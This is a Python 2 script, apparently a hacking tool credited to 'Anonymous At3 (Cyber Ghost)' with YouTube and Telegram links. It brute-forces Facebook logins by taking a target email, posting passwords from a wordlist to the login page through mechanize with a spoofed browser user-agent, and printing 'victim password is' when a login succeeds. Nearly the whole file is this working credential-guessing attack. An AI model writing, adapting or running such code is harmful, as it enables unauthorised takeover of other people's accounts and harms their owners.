import time
import sys

if sys.version_info[0] !=2: 
	print('''--------------------------------------
	REQUIRED PYTHON 2.x
	use: python fb.py
--------------------------------------
			''')
	sys.exit()

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
	import mechanize
	import urllib2
	browser = mechanize.Browser()
	browser.addheaders = [('User-Agent',headers['User-Agent'])]
	browser.set_handle_robots(False)
except:
	print('\n\tPlease install mechanize.\n')
	sys.exit()

print("   ___                                                       ___  _   _____  ")
print("  / _ \                                                     / _ \| | |____ | ")
print(" / /_\ \_ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___  / /_\ \ |_    / / ")
print(" |  _  | '_ \ / _ \| '_ \| | | | '_ ` _ \ / _ \| | | / __| |  _  | __|   \ \ ")
print(" | | | | | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \ | | | | |_.___/ / ")
print(" \_| |_/_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/ \_| |_/\__\____/  ")
print("                           __/ |                                             ")
print("                          |___/                                              \n")
print("                            This Script Was Made By Anonymous At3 (Cyber Ghost)                         ")
print("                            youtube Anonymous At3 - https://www.youtube.com/channel/UChNoHwc5jT9YU5RtKzX_c7A  ")
print("                            Telegram - https://t.me/joinchat/MPDg7xVrWnGFHarjBj0-ZA ")
file=open('passwords.txt','r')

email=str(raw_input('Enter Email/Username : ').strip())

print "\nTarget Email ID : ",email
print "\nTrying Passwords from list ..."

i=0
while file:
	passw=file.readline().strip()
	i+=1
	if len(passw) < 6:
		continue
	print str(i) +"] Password Not Found : ",passw
	response = browser.open(post_url)
	try:
		if response.code == 200:
			browser.select_form(nr=0)
			browser.form['email'] = email
			browser.form['pass'] = passw
			response = browser.submit()
			if 'Find Friends' in response.read():
				print('victim password is : ',passw)
				break
	except:
		print('\nSleeping for time : 1 seconds\n')
		time.sleep(1)
